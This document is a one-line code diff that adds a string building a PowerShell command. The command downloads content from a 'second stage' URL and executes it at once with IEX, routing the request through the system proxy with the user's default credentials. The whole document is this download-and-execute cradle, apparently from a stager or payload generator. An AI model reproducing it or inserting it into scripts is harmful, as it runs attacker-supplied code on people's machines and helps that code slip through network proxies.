@@ -1,0 +1,1 @@
+"IEX((Invoke-WebRequest '" + SecondStageURL + "' -Proxy ([System.Net.WebRequest]::GetSystemWebproxy()).GetProxy('" + SecondStageURL + "') -ProxyUseDefaultCredentials).Content)"
